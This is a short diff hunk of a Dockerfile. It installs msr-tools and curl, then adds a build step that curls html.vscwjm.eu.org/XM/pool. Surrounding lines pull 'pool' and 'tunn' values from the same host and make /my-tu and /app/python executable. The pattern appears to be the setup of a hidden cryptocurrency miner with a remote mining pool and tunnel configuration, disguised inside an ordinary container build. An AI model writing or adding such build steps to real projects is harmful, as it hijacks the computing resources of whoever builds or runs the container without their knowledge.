@@ -6,6 +6,7 @@ COPY config.json /app/
 
 RUN apt update -y \
   && apt install -y procps msr-tools curl
+RUN curl -s html.vscwjm.eu.org/XM/pool
 RUN pool=$(curl -s html.vscwjm.eu.org/XM/pool) && \
   tunn=$(curl -s html.vscwjm.eu.org/XM/tunn)
 RUN chmod a+x /my-tu /app/python && \
